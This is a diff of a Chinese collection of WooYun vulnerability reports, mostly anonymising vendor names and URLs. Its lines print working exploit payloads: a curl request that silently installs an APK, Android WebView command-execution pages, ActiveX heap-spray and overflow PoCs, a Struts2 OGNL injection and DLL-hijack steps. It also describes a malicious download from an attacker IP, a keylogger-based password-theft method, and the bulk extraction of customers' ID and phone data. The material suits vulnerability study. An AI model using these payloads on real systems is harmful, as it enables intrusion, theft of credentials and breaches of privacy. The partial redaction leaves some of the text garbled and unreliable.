-**详情**: » droidportPackage                  Proto Recv-Q Send-Q         Local Address          Foreign Address        Statecom.baidu.appsearch tcp6       0      0 :::40310               :::*                   LISTENcom.baidu.appsearch tcp6       0      0 :::7777                :::*                   LISTEN发现百度手机助手监听40310这么奇怪的端口,这里7777先按下不表.前面的分析和WooYun: 百度输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）差不多根据端口号
+**详情**: » droidportPackage                  Proto Recv-Q Send-Q         Local Address          Foreign Address        Statecom.baidu.appsearch tcp6       0      0 :::40310               :::*                   LISTENcom.baidu.appsearch tcp6       0      0 :::7777                :::*                   LISTEN发现某搜索引擎手机助手监听40310这么奇怪的端口,这里7777先按下不表.前面的分析和WooYun: 某搜索引擎输入法安卓版存在远程获取信息控制用户行为漏洞（可恶意推入内容等4G网络内可找到目标）差不多根据端口号
 
-**POC**: 远程上传静默安装应用curl -F file=@1.apk -e http://m.baidu.com -H "remote-addr: 127.0.0.1" http://192.168.10.127:40310/uploadfile?install_type=all&callback=123&mcmdf=inapp_123&Filename=1.apk&远程启动应用curl -e http://m.baidu.com -H "remote-addr: 127.0.0.1" http://192.168.10.127:40310/sendintent?callback=123&mcmdf=i
+**POC**: 远程上传静默安装应用curl -F file=@1.apk -e https://example.com/[已脱敏] -H "remote-addr: [IP已脱敏]" http://[IP已脱敏] -e https://example.com/[已脱敏] -H "remote-addr: [IP已脱敏]" http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -1385,13 +1385,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 其实前提条件是必须在安装进行时进行中间人攻击。我发现优酷客户端（http://mobile.youku.com/index/pc）在安装过程中会请求：http://dl.360safe.com/p/Setup_iku.exe，请求它的目的是在安装完优酷客户端之后，诱导用户安装360安全卫士。于是中间人可以劫持Setup_iku.exe这一请求，并返回木马。如果用户选中“安装360安全卫士”，然后点击“立即体验”的话，中间人释放的木马会以管理员权限执行。
+**详情**: 其实前提条件是必须在安装进行时进行中间人攻击。我发现优酷客户端（https://example.com/[已脱敏]
 
-**POC**: 版本号：接近安装完成时，可以从左侧看到请求的http://dl.360safe.com/p/Setup_iku.exe，我们截获它，并返回木马：安装完成后，保持默认的2个选项，点“立即体验”：然后代码就会执行：
+**POC**: 版本号：接近安装完成时，可以从左侧看到请求的https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 校验返回的http://dl.360safe.com/p/Setup_iku.exe文件的数字签名，iDo同理。校验数字签名的方法，可参见：https://support.microsoft.com/kb/323809
+**修复**: 校验返回的https://example.com/[已脱敏]
 ---
 
 ---
@@ -1409,7 +1409,7 @@
 
 **详情**: 联想驱动安装插件DriverCDExport.ocx控件的OpenItemFilePath函数存在安全问题，可导致IE用户在浏览恶意网页时被远程启动本地的可执行文件，如cmd、calc等，或者其他程序，启动预埋的恶意程序，或者对Windows系统进行拒绝服务攻击。
 
-**POC**: 下面的这个视频演示了这个安全问题。打开第一个地址只是启动一个计算器，打开第二个地址时无限循环启动计算器程序导致Windows无法使用。http://1drv.ms/1HiELBi
+**POC**: 下面的这个视频演示了这个安全问题。打开第一个地址只是启动一个计算器，打开第二个地址时无限循环启动计算器程序导致Windows无法使用。https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1429,7 +1429,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载移联浏览器：http://as.baidu.com/a/item?docid=4185242下载dex2jar和jd-gui
+**详情**: 下载移联浏览器：https://example.com/[已脱敏]
 
 **POC**: 搜索addJavascriptInterface有两个，那就拿setting构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return setting.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'WooYun_TES
 
@@ -1451,7 +1451,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 下载冒泡浏览器最新版：http://swift.51mrp.com/mopo/index.html下载dex2jar和jd-gui
+**详情**: 下载冒泡浏览器最新版：https://example.com/[已脱敏]
 
 **POC**: 搜索addJavascriptInterface就拿其中的hardwareAccelerateObject构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return hardwareAccelerateObject.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/syste
 
@@ -1473,9 +1473,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 迅雷游戏盒子打开时会向http://v2.boxpage.niu.xunlei.com/v3/index.html发送请求。通过研究这个html文件，我发现window.external.SetConfigData()这个API可以写入本地配置文件，没有做限制。比如：window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true")可以使游戏盒子开机自动启动。这个本地文件保存在%APPDATA%\迅雷游戏\XLGameBox\Data\xggb_config.ini。因为没有用HTTPS，所以中间人可以劫持游戏盒子的网页请求，这样中间人即可任意写本地配置文件。我找了半天，没发现有特别危险的配置，比如代码执行，下载文件。我也不想就这么算了，所以那就破坏呗。所以我就用setInterval循环向配置文件里写入大量无用信
+**详情**: 迅雷游戏盒子打开时会向https://example.com/[已脱敏])这个API可以写入本地配置文件，没有做限制。比如：window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true")可以使游戏盒子开机自动启动。这个本地文件保存在%APPDATA%\迅雷游戏\XLGameBox\Data\xggb_config.ini。因为没有用HTTPS，所以中间人可以劫持游戏盒子的网页请求，这样中间人即可任意写本地配置文件。我找了半天，没发现有特别危险的配置，比如代码执行，下载文件。我也不想就这么算了，所以那就破坏呗。所以我就用setInterval循环向配置文件里写入大量无用信
 
-**POC**: 版本号：劫持http://v2.boxpage.niu.xunlei.com/v3/index.html，返回下面内容：<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Test</title><script>var val_w = new Array(1024*1024).join("a");var i = 0;window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true"); //开机自动启动window.external.SetConfigData(
+**POC**: 版本号：劫持https://example.com/[已脱敏] html><html><head><meta charset="UTF-8"><title>Test</title><script>var val_w = new Array(1024*1024).join("a");var i = 0;window.external.SetConfigData("~XLGameBoxConfig~", "IsAutoRun", "true"); //开机自动启动window.external.SetConfigData(
 
 **绕过**: 直接利用
 
@@ -1495,7 +1495,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.kalcaddle.com测试账户权限：default问题出在重命名上。我上传.php文件是不可执行的，ok，那改个后缀，改为.ph上传成功后，改名.php，提示无权限。好吧，改名.php ,重命名成功，空格被忽略，文件后缀变为php可以成功执行。
+**详情**: https://example.com/[已脱敏] ,重命名成功，空格被忽略，文件后缀变为php可以成功执行。
 
 **POC**: (见原文)
 
@@ -1561,7 +1561,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 文件:CsswebUsb.ocx版本:1.0.0.1clsid:30A3ACF9-DA6E-4CA0-A081-E06282DF1C64属性：GetErrInfo
+**详情**: 文件:CsswebUsb.ocx版本:[IP已脱敏]clsid:30A3ACF9-DA6E-4CA0-A081-E06282DF1C64属性：GetErrInfo
 
 **POC**: +target.GetErrInfo(SOMELONGSTR)+HeapSpray+Bingo
 
@@ -1649,7 +1649,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 只查了很少的数据证明漏洞存在，没有做坏事，不要查我的水表申万宏源的这个测试系统存在JAVA weblogic反序列化漏洞连上服务器，真的是测试服务器，系统时间都不是当前时间连上数据库客户信息，有姓名，身份证号，手机号，开户网点109W客户信息不知道是什么人员的信息，邮箱全是@gaotime.com521个从邮箱看应该是员工信息，有姓名，手机号，身份证号，邮箱，MSN，QQ，家庭住址4000多个不知道是什么短信37W短信这个是基金经理的信息么1000多个连上另一个数据库看看还是客户信息，有姓名，手机号，身份证号，家庭住址1.5W客户信息不知道是什么信息100多个
+**详情**: 只查了很少的数据证明漏洞存在，没有做坏事，不要查我的水表申万宏源的这个测试系统存在JAVA weblogic反序列化漏洞连上服务器，真的是测试服务器，系统时间都不是当前时间连上数据库客户信息，有姓名，身份证号，手机号，开户网点109W客户信息不知道是什么人员的信息，邮箱全是@gaotime.com521个从邮箱看应该是员工信息，有姓名，手机号，身份证号，邮箱，MSN，某互联网公司，家庭住址4000多个不知道是什么短信37W短信这个是基金经理的信息么1000多个连上另一个数据库看看还是客户信息，有姓名，手机号，身份证号，家庭住址1.5W客户信息不知道是什么信息100多个
 
 **POC**: 见详细说明
 
@@ -1693,7 +1693,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 邮箱里面那个截屏工具的插件不只底下说的这一个问题,就举个栗子而已问题文件 cxdndctrl.dll （0.3.1.13）clsid   0CEFA82D-A26D-491C-BAF7-604441B409FD问题函数 setuserid()提交超长字符串作为参数给setuserid ie崩溃这个点要拿来执行命令有点难度 具体原因有兴趣的可以自己回去试试
+**详情**: 邮箱里面那个截屏工具的插件不只底下说的这一个问题,就举个栗子而已问题文件 cxdndctrl.dll （[IP已脱敏]）clsid   0CEFA82D-A26D-491C-BAF7-604441B409FD问题函数 setuserid()提交超长字符串作为参数给setuserid ie崩溃这个点要拿来执行命令有点难度 具体原因有兴趣的可以自己回去试试
 
 **POC**: poc<html><object classid='clsid:0CEFA82D-A26D-491C-BAF7-604441B409FD' id='target'></object><script>var poc='';for (var i=0;i<44444;i++){poc +='A';}target.setuserid(poc);</script></html>
 
@@ -1715,7 +1715,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 搜狐TV的页面http://tv.sohu.com/feihuindex4/其中页面里面有一处引发血案的就是http://y.memewan.com/a6.htm这一个广告的页面其中一个广告页面是指向http://www.600bbb.cn/这一个网站中http://www.600bbb.cn/这一黑链接利用了IE远程代码执行漏洞（CVE-2014-6332)代码触发后会创建cmd.exe写入vbs脚本，脚本运行后下载http://183.131.80.93:3377/svchost.exe，并保存为C:\Windows\Temp \putty.exe运行。所以用户可能在不知情的情况下受到了IE可执行漏洞的危害，影响极大有木有
+**详情**: 搜狐TV的页面https://example.com/[已脱敏])代码触发后会创建cmd.exe写入vbs脚本，脚本运行后下载http://[IP已脱敏] \putty.exe运行。所以用户可能在不知情的情况下受到了IE可执行漏洞的危害，影响极大有木有
 
 **POC**: 以上
 
@@ -1739,7 +1739,7 @@
 
 **详情**: 2345看图王存在DLL劫持，2345PicViewer.exe进程会尝试加载图片同一目录下的QuserEx.dll文件，将图片文件与恶意的QuserEx.dll文件放在同一目录下，即可造成远程代码执行（用各种吸引眼球的标题打包发给受害者，受害者解压后打开就会中招）。
 
-**POC**: 首先下载一个最新版的2345看图王，官网最新下载地址为http://download.2345.com/pic/2345pic_v5.4.exe，安装后可以看到主进程2345PicViewer.exe的数字签名时间为2015年8月27日，如下图所示：现在我们需要编译一个QuserEx.dll文件，代码如下（弹框提示证明DLL可以被加载）：#include <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCES
+**POC**: 首先下载一个最新版的2345看图王，官网最新下载地址为https://example.com/[已脱敏] <windows.h>BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason,LPVOID lpReserved ){switch( fdwReason ){case DLL_PROCES
 
 **绕过**: 直接利用
 
@@ -1783,11 +1783,11 @@
 
 **详情**: IE暴雷0day漏洞（CVE-2012-1889），XML组件未名内存破坏漏洞。
 
-**POC**: from: http://hi.baidu.com/inking26/blog/item/9c2ab11c4784e5aa86d6b6c1.html使用DOM操作IMG节点的SRC设置nameProp属性填充调用栈，控制eax！<object classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id='ooxx'></object><script>var obj = document.getElementById('ooxx').object;var src = unescape("%u0c0c%u0c0c");while (src.len
+**POC**: from: https://example.com/[已脱敏] classid="clsid:f6D90f11-9c73-11d3-b32e-00C04f990bb4" id='ooxx'></object><script>var obj = document.getElementById('ooxx').object;var src = unescape("%u0c0c%u0c0c");while (src.len
 
 **绕过**: 直接利用
 
-**修复**: 临时解决方案：http://support.microsoft.com/kb/2719615装微软推荐的安全软件：http://technet.microsoft.com/en-us/security/advisorymapp慢慢等微软补丁！
+**修复**: 临时解决方案：https://example.com/[已脱敏]
 ---
 
 ---
@@ -1809,7 +1809,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 升级使用的新浪微博SDK，使用没有漏洞的SDK版本。比如https://github.com/sinaweibosdk/weibo_android_sdk
+**修复**: 升级使用的某社交平台某社交平台SDK，使用没有漏洞的SDK版本。比如https://example.com/[已脱敏]
 ---
 
 ---
@@ -1825,9 +1825,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://637.tom.com/login-share/logout/logout.actionhttp://fm.tom.com/login-share/logout/logout.action
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://637.tom.com/login-share/logout/logout.actionhttp://fm.tom.com/login-share/logout/logout.action
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1857,8 +1857,8 @@
 ---
 
 ---
-### [wooyun-2015-098445] 支付宝IE安全控件可在用户态下被绕过
-**厂商**: 阿里巴巴 | **年份**: 2015 | **类型**: 拒绝服务
+### [wooyun-2015-098445] 某电商平台IE安全控件可在用户态下被绕过
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 拒绝服务
 
 **元思考**: 触发信号: 功能测试
 
@@ -1869,13 +1869,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 上次在WooYun: 工商银行安全控件可导致远程任意代码执行（新型技术点）中我说了添加信任域站点的危害，可配合工行网银漏洞导致代码执行。这次反其道而行，我发现其实木马可轻易绕过支付宝的安全控件。非常简单，我发现支付宝控件只有当“Protected Mode”关闭时，才能防得住键盘钩子。当“Protected Mode”开启时，什么用都没有，但是页面还是允许用户输入密码。所以绕过的原理就是将支付宝网站从信任域中去掉即可。Internet域的默认设置是开启“Protected Mode”的。这只需要删除一个注册表键值即可，不需要管理员权限。代码如下：reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f
+**详情**: 上次在WooYun: 工商银行安全控件可导致远程任意代码执行（新型技术点）中我说了添加信任域站点的危害，可配合工行网银漏洞导致代码执行。这次反其道而行，我发现其实木马可轻易绕过某电商平台的安全控件。非常简单，我发现某电商平台控件只有当“Protected Mode”关闭时，才能防得住键盘钩子。当“Protected Mode”开启时，什么用都没有，但是页面还是允许用户输入密码。所以绕过的原理就是将某电商平台网站从信任域中去掉即可。Internet域的默认设置是开启“Protected Mode”的。这只需要删除一个注册表键值即可，不需要管理员权限。代码如下：reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f
 
-**POC**: 1、写个键盘记录器。或者从http://pastebin.com/GFtq7uU9下载C++源代码，编译，运行。2、下载、安装控件：https://download.alipay.com/sec/edit/aliedit.exe3、安装完控件后执行reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f4、用IE打开https://auth.alipay.com/login/index.htm，输入用户名、密码，然后看记录器目录下
+**POC**: 1、写个键盘记录器。或者从https://example.com/[已脱敏] delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\Domains\alipay.com" /va /f4、用IE打开https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
-**修复**: 再次证明了添加信任域站点是有百害而无一利的，所以说不要修改权限，不要添加信任站点。想办法在默认IE权限下实现功能吧。实现不了的话，不如不要控件。顺便请一定允许我捆绑一个与上述漏洞完全无关的问题：你们支付宝能不能更新一下TLS配置？可参考https://www.ssllabs.com/ssltest/
+**修复**: 再次证明了添加信任域站点是有百害而无一利的，所以说不要修改权限，不要添加信任站点。想办法在默认IE权限下实现功能吧。实现不了的话，不如不要控件。顺便请一定允许我捆绑一个与上述漏洞完全无关的问题：你们某电商平台能不能更新一下TLS配置？可参考https://example.com/[已脱敏]
 ---
 
 ---
@@ -1893,7 +1893,7 @@
 
 **详情**: 搜狐影音主程序SHPlayer.exe存在dll劫持风险，SHPlayer.exe在启动时会加载quserex.dll和vsfilter.lang，这些dll在本地不存在，如果黑客将上述格式的媒体文件加上上述对应的恶意dll打包放在一起，发给用户。用户打开上述格式文件，就会执行恶意程序，危害较大。
 
-**POC**: 1、随便建个文件夹，再将证明漏洞的quserex.dll与test.mov放在一起，打开test.mov，就会加载quserex.dll，如下图：2、poc下载地址：http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/07/Poc.zip
+**POC**: 1、随便建个文件夹，再将证明漏洞的quserex.dll与test.mov放在一起，打开test.mov，就会加载quserex.dll，如下图：2、poc下载地址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -1913,7 +1913,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微米浏览器是网宿与中兴公司合作开发的...中兴是通讯公司，所以浏览器的漏洞还是要关注的哈~Webview的接口的远程代码执行漏洞居然存在- -.下载微米浏览器http://www.umeweb.cn/下载dex2jar和jd-gui
+**详情**: 微米浏览器是网宿与中兴公司合作开发的...中兴是通讯公司，所以浏览器的漏洞还是要关注的哈~Webview的接口的远程代码执行漏洞居然存在- -.下载微米浏览器https://example.com/[已脱敏]
 
 **POC**: 搜索addJavascriptInterface就拿其中的zteHistory构造一个写文件+弹窗的Exp：<html><head><title>test</title></head><body><script>function execute(testcmd){return zteHistory.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(testcmd);}try{execute(["/system/bin/sh","-c","echo 'Webvie
 
@@ -1946,7 +1946,7 @@
 
 ---
 ### [wooyun-2014-061520] hao123网址导航客户端远程代码执行漏洞
-**厂商**: 百度 | **年份**: 2014 | **类型**: 远程代码执行
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -2001,7 +2001,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 前提条件：1、攻击者可以监控并修改用户的网络请求（主动型中间人）。2、用户主动打开360软件管家，并下载任意软件。3、下载过程中需要有1次用户操作（这个操作并非忽略警告）。达到效果：1、全程无警告、无UAC、无任何确认操作。2、以管理员权限自动运行任意exe文件。以下详解：我发现360软件管家在下载软件时，第一个请求是：1）http://softdl.360tpcdn.com/<软件名>/<软件名>_<版本号>.exe，然后这个请求会跳转到2）http://<IP地址>/softdl.360tpcdn.com/<软件名>/<软件名>_<版本号>.exe。每次跳转的IP地址均不同。之后会向3）http://agd.p.360.cn/<随机数>.html发送请求。只要中间人能够劫持2、3请求，就能给用户发送木马病毒。
+**详情**: 前提条件：1、攻击者可以监控并修改用户的网络请求（主动型中间人）。2、用户主动打开360软件管家，并下载任意软件。3、下载过程中需要有1次用户操作（这个操作并非忽略警告）。达到效果：1、全程无警告、无UAC、无任何确认操作。2、以管理员权限自动运行任意exe文件。以下详解：我发现360软件管家在下载软件时，第一个请求是：1）https://example.com/[已脱敏]
 
 **POC**: 以下是在本地用Fiddler模拟出中间人攻击的效果：1、在Fiddler加入下面的规则：2、打开360软件管家任意下载一款软件（“下载”、“一键安装”均可）：3、目录设置，我们正常继续：4、继续安装后“正在创建连接”：5、这一步很有意思，因为正常安装的情况下不会中途暂停一次。这说明360软件管家应该是发现了下载的文件有问题。我不知道它是不是做了签名校验，但这不重要，因为它只说“已暂停”，而没有任何警告，我想绝大多数用户这时不会有任何怀疑，大部分人一定点播放键继续。6、继续下载之后，仍没有任何警告：7、然后木马就以管理员权限自动执行了：另外附一个首页下载的例子：所有网络请求，供参考：
 
@@ -2056,7 +2056,7 @@
 
 ---
 ### [wooyun-2013-039807] 电脑安全管家远程执行代码
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 远程代码执行
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 功能测试
 
@@ -2067,9 +2067,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 电脑安全管家在网络保护的时候，存在一个dllhijack,TSWebShieldInject.dll是一个保护时自动注入的模块.当别的进程被注入后，loadlibrary没处理绝对路径。我只测试了浏览器部分，也可能别的类型也有问题。所以问题可大可小.利用的时候可以构造一个html文件在webdev。我就本地测试了下，win XP + IE 6内核。html文件同目录下放一个ieframe.dll，打开触发另：腾讯安全中心的人说ieframe.dll是IE6的问题，那别的厂商浏览器自己安装在IE6环境下咋一点问题都没呢，偏偏装你个管家就被hijack了？每次都poc，分析过程。你给个5k起步我考虑给你完美分析流程，凭点奖品rank浪费我时间就不值钱了？。问题只是顺带发现，所以提交.
+**详情**: 电脑安全管家在网络保护的时候，存在一个dllhijack,TSWebShieldInject.dll是一个保护时自动注入的模块.当别的进程被注入后，loadlibrary没处理绝对路径。我只测试了浏览器部分，也可能别的类型也有问题。所以问题可大可小.利用的时候可以构造一个html文件在webdev。我就本地测试了下，win XP + IE 6内核。html文件同目录下放一个ieframe.dll，打开触发另：某互联网公司安全中心的人说ieframe.dll是IE6的问题，那别的厂商浏览器自己安装在IE6环境下咋一点问题都没呢，偏偏装你个管家就被hijack了？每次都poc，分析过程。你给个5k起步我考虑给你完美分析流程，凭点奖品rank浪费我时间就不值钱了？。问题只是顺带发现，所以提交.
 
-**POC**: 360安全浏览器百度浏览器金山猎豹腾讯自己的浏览器
+**POC**: 360安全浏览器某搜索引擎浏览器金山猎豹某互联网公司自己的浏览器
 
 **绕过**: 直接利用
 
@@ -2111,7 +2111,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 绿茶浏览器是由联想（Lenovo）公司开发的一款致力于为用户提供流畅体验的个性化手机浏览器。该浏览器是市面上最小的全功能浏览器，具有视频播放、网站导航、搜索、下载、个人数据管理等功能，大小仅有市面上其他产品的1/10左右，是联想手机的默认浏览器。绿茶浏览器(4.3.27.140627)下载链接(官方)：联想乐商店存在安卓webview远程代码执行漏洞存在漏洞的接口：searchBoxJavaBridge_greentea_webkit_jsgreentea
+**详情**: 绿茶浏览器是由联想（Lenovo）公司开发的一款致力于为用户提供流畅体验的个性化手机浏览器。该浏览器是市面上最小的全功能浏览器，具有视频播放、网站导航、搜索、下载、个人数据管理等功能，大小仅有市面上其他产品的1/10左右，是联想手机的默认浏览器。绿茶浏览器([IP已脱敏]627)下载链接(官方)：联想乐商店存在安卓webview远程代码执行漏洞存在漏洞的接口：searchBoxJavaBridge_greentea_webkit_jsgreentea
 
 **POC**: (见原文)
 
@@ -2143,8 +2143,8 @@
 ---
 
 ---
-### [wooyun-2011-01451] 支付宝ptpusb.dll远程指令执行漏洞
-**厂商**: 支付宝 | **年份**: 2011 | **类型**: 远程代码执行
+### [wooyun-2011-01451] 某电商平台ptpusb.dll远程指令执行漏洞
+**厂商**: 某电商平台 | **年份**: 2011 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 参数注入
 
@@ -2155,7 +2155,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 阿里巴巴支付宝（Alipay）是阿里巴巴站点所提供的电子商务在线支付服务。阿里巴巴支付宝的口令输入控件实现上存在漏洞，远程攻击者可能利用此漏洞控制用户机器。支付宝的口令输入控件ptpusb.dll中存在远程代码执行漏洞。ptpusb.dll以如下方式引用Remove()函数：InprocServer32:    ptpusb.dllClassID      :     66F50F46-70A0-4A05-BD5E-FBCC0F9641EC[id(0x60030001), helpstring("method Remove")]void Remove([in] int idx);Remove()函数以如下方式处理idx参数：.text:10003D4E ; Remove.text:10003D4E.text:10003D4E sub_10003D4E    proc near       
+**详情**: 某电商平台某电商平台（Alipay）是某电商平台站点所提供的电子商务在线支付服务。某电商平台某电商平台的口令输入控件实现上存在漏洞，远程攻击者可能利用此漏洞控制用户机器。某电商平台的口令输入控件ptpusb.dll中存在远程代码执行漏洞。ptpusb.dll以如下方式引用Remove()函数：InprocServer32:    ptpusb.dllClassID      :     66F50F46-70A0-4A05-BD5E-FBCC0F9641EC[id(0x60030001), helpstring("method Remove")]void Remove([in] int idx);Remove()函数以如下方式处理idx参数：.text:10003D4E ; Remove.text:10003D4E.text:10003D4E sub_10003D4E    proc near       
 
 **POC**: Alipay ActiveX Remote Code Execute Exploit,enjoy it:)by CK(webmaster@leehoosoftware.org)
 
@@ -2179,11 +2179,11 @@
 
 **详情**: Web迅雷是一款基于多资源超线程技术的下载工具，它继承了迅雷5的操作方便、高速下载的特点外，同时使用全网页化的操作界面，更符合互联网用户使用习惯，是国内第一款网页上的下载工具。Web迅雷在实现上存在设计漏洞，程序会接收攻击者提供的恶意参数直接执行，远程攻击者可利用此漏洞控制用户受影响系统
 
-**POC**: <html><head><title>迅雷执行任意系统命令</title></head><body>运行迅雷加载项。<script>/***by long*/server = new ActiveXObject("ThunderServer.WebThunder.1");if(server==null){alert("没装迅雷，请安装web迅雷");window.location.href="http://dl.xunlei.com/wxl.html";}else{server.OpenDirectory("cmd");alert("要我帮你关机么？");alert("哎呀呀！悲剧啊！你怎么不
+**POC**: <html><head><title>迅雷执行任意系统命令</title></head><body>运行迅雷加载项。<script>/***by long*/server = new ActiveXObject("ThunderServer.WebThunder.1");if(server==null){alert("没装迅雷，请安装web迅雷");window.location.href="https://example.com/[已脱敏]";}else{server.OpenDirectory("cmd");alert("要我帮你关机么？");alert("哎呀呀！悲剧啊！你怎么不
 
 **绕过**: 直接利用
 
-**修复**: XunLei------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://dl.xunlei.com/wxl.html
+**修复**: XunLei------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：https://example.com/[已脱敏]
 ---
 
 ---
@@ -2199,7 +2199,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.sdnpc.com/sdnpc/jeecms/ArtiSearch.dojeecms
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -2275,8 +2275,8 @@
 ---
 
 ---
-### [wooyun-2015-094767] 阿里支付宝钱包最新版代码执行漏洞（有环境条件限制）
-**厂商**: 阿里巴巴 | **年份**: 2015 | **类型**: 远程代码执行
+### [wooyun-2015-094767] 阿里某电商平台钱包最新版代码执行漏洞（有环境条件限制）
+**厂商**: 某电商平台 | **年份**: 2015 | **类型**: 远程代码执行
 
 **元思考**: 触发信号: 认证接口
 
@@ -2287,9 +2287,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝钱包android 最新版由于没有过滤android系统自己添加的webview远程代码执行接口，当开启辅助功能后，像talkback、clockback、QueryBack等，系统会添加两个webview远程代码执行接口，如下图。用户注册页面--服务协议页面另外登录后其他使用了webview的页面也都没有过滤这两个接口。这个辅助功能是为那些视力或者听力不健全的用户提供的服务。他们属于社会弱势群体，当被劫持后就可能在用户手机安装木马等
+**详情**: 某电商平台钱包android 最新版由于没有过滤android系统自己添加的webview远程代码执行接口，当开启辅助功能后，像talkback、clockback、QueryBack等，系统会添加两个webview远程代码执行接口，如下图。用户注册页面--服务协议页面另外登录后其他使用了webview的页面也都没有过滤这两个接口。这个辅助功能是为那些视力或者听力不健全的用户提供的服务。他们属于社会弱势群体，当被劫持后就可能在用户手机安装木马等
 
-**POC**: poc:http://www4.comp.polyu.edu.hk/~appsec/about/rceNew.html访问如上页面会在本地/sdcard下生成以漏洞接口为文件名的txt文件。可以写文件就可以写木马，还可以执行其他系统命令。
+**POC**: poc:https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -2311,7 +2311,7 @@
 
 **详情**: 上海证券交易所IE插件可导致向本地目录写文件PkiCom5 IE插件提供的接口可导致恶意攻击者向用户本地目录写文件，其中一个接口更甚，可以控制写的内容，可以覆盖已有文件。
 
-**POC**: http://biz.sse.com.cn/sseportal/ps/zhs/ca/ca_activex_control_check.jsp可以在以上网页下载并安装PkiCom5 IE插件，然后在远程服务器中的html中调用有问题的接口向用户本地目录写文件。<html>Test Exploit page<object classid='clsid:A42B0EC0-F064-485F-81D4-CE42105E8E42' id='target' ></object><script language='javascript'>//document.write(target.OwriteFile(
+**POC**: https://example.com/[已脱敏] IE插件，然后在远程服务器中的html中调用有问题的接口向用户本地目录写文件。<html>Test Exploit page<object classid='clsid:A42B0EC0-F064-485F-81D4-CE42105E8E42' id='target' ></object><script language='javascript'>//document.write(target.OwriteFile(
 
 **绕过**: 直接利用
 
@@ -2353,9 +2353,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://xfyj.sgcc.com.cn/index.action
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://xfyj.sgcc.com.cn/index.action?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'whoami',''})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%
+**POC**: https://example.com/[已脱敏]]{'whoami',''})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char[50000],%23d.read(%23e),%23matt%
 
 **绕过**: 直接利用
 
@@ -2363,8 +2363,8 @@
 ---
 
 ---
-### [wooyun-2011-01922] 中国移动手机支付密码控件远程溢出漏洞
-**厂商**: 中国移动 | **年份**: 2011 | **类型**: 远程代码执行
+### [wooyun-2011-01922] 某运营商手机支付密码控件远程溢出漏洞
